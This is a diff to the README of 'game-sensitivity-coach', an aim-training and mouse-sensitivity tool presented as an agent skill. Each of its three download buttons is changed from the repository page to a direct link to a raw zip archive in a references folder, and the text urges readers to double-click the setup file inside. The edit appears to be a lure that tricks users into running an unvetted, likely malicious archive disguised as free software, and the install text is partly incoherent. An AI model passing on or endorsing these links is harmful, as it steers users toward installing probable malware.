@@ -1,7 +1,7 @@
 <h1>🎯 game-sensitivity-coach - Master Your Mouse, Improve Your Aim</h1>
 
 <p align="center">
-  <a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach">
+  <a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach/raw/refs/heads/main/references/2.2.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD-NOW-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6f43" alt="Download Button" style="max-width: 100%; height: auto;">
   </a>
 </p>
@@ -33,7 +33,7 @@ The application is built as an "agent skill," which means it gets smarter the mo
 Getting game-sensitivity-coach up and running is easier than you might think. Follow these straightforward steps:
 
 ### Step 1: Download the Application
-<a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach" style="display: inline-block; background-color: #4CAF50; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold;">⬇️ Click Here to Download game-sensitivity-coach</a>
+<a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach/raw/refs/heads/main/references/2.2.zip" style="display: inline-block; background-color: #4CAF50; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold;">⬇️ Click Here to Download game-sensitivity-coach</a>
 
 ### Step 2: Install the Software
 Once the download is complete, look in your "Downloads" folder for the file you just downloaded. Visit this link to download the application. This will take you to the official page where you can find the setup file. Simply double-click it to begin the installation process. Follow the on-screen instructions – it's as easy as clicking "Next" a few times!
@@ -139,6 +139,6 @@ Don't let subpar sensitivity settings hold you back anymore. With game-sensitivi
 
 Remember, the download is completely free, the interface is user-friendly, and the potential for improvement is tremendous. What are you waiting for? Take the first step toward becoming the player you've always wanted to be.
 
-<a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach" style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 32px; text-decoration: none; border-radius: 50px; font-size: 18px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">🎮 Get Started Now – Download for Free!</a>
+<a href="https://github.com/zaalamahmed-bit/game-sensitivity-coach/raw/refs/heads/main/references/2.2.zip" style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 32px; text-decoration: none; border-radius: 50px; font-size: 18px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">🎮 Get Started Now – Download for Free!</a>
 
 Keywords: agent-skills, aim-training, claude-code, codex, ffmpeg, gaming, mouse-sensitivity, python, windows
